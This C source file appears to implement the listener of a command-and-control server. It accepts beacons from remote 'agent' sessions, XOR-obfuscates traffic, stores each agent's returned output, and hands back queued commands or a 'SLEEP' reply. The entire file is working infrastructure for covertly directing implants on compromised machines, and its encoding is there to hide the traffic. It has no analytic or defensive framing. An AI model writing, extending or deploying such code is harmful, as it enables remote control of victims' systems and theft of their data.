#include "../include/Tcp.h"
#include <stdio.h>
#include <string.h>

#ifdef _WIN32
    #include <winsock2.h>
#else
    #include <fcntl.h>
    #include <netinet/in.h>
#endif

NetSock TcpListen(const Config *C)
{
    NetSock Sock = socket(AF_INET, SOCK_STREAM, 0);
    if (Sock == NetInvalid) return NetInvalid;

    int Opt = 1;
    setsockopt(Sock, SOL_SOCKET, SO_REUSEADDR, (const char *)&Opt, sizeof(Opt));

    struct sockaddr_in Sin;
    memset(&Sin, 0, sizeof(Sin));
    Sin.sin_family      = AF_INET;
    Sin.sin_addr.s_addr = inet_addr(C->BindAddr);
    Sin.sin_port        = htons((unsigned short)C->Port);

    if (bind(Sock, (struct sockaddr *)&Sin, sizeof(Sin)) < 0 || listen(Sock, 32) < 0) {
        NetClose(Sock); return NetInvalid;
    }
    return Sock;
}

void TcpNonBlock(NetSock Sock)
{
#ifdef _WIN32
    unsigned long F = 1;
    ioctlsocket(Sock, FIONBIO, &F);
#else
    fcntl(Sock, F_SETFL, fcntl(Sock, F_GETFL, 0) | O_NONBLOCK);
#endif
}

static void TcpDispatch(NetSock Conn, SessionPool *P, const char *PeerAddr)
{
    char Buf[BufSize] = {0};
    int N = recv(Conn, Buf, BufSize - 1, 0);
    if (N <= 0) return;
    Buf[N] = '\0';
    ApplyXor(Buf, (size_t)N);

    int PrevCount    = P->Count;
    AgentSession *S  = PoolRegister(P, PeerAddr);
    if (!S) return;
    int IsNew = (P->Count > PrevCount);
    if (IsNew) PoolNotifyConnect(P, S);

    if (strcmp(Buf, "Standby") != 0) {
        memset(S->LastOutput, 0, BufSize);
        memcpy(S->LastOutput, Buf, (size_t)N);
        PoolNotifyOutput(P, S);
    }

    if (S->HasPending) {
        char Enc[BufSize];
        size_t CmdLen = strlen(S->Pending);
        memcpy(Enc, S->Pending, CmdLen);
        ApplyXor(Enc, CmdLen);
        send(Conn, Enc, (int)CmdLen, 0);
        memset(S->Pending, 0, BufSize);
        S->HasPending = 0;
    } else {
        char Sleep[] = "SLEEP";
        ApplyXor(Sleep, strlen(Sleep));
        send(Conn, Sleep, (int)strlen(Sleep), 0);
    }
}

void TcpHandleBeacon(NetSock Listener, SessionPool *P)
{
    struct sockaddr_in Peer;
    socklen_t PeerLen = sizeof(Peer);
    NetSock Conn = accept(Listener, (struct sockaddr *)&Peer, &PeerLen);
    if (Conn == NetInvalid) return;
    char PeerAddr[AddrSize];
    strncpy(PeerAddr, inet_ntoa(Peer.sin_addr), AddrSize - 1);
    TcpDispatch(Conn, P, PeerAddr);
    NetClose(Conn);
}
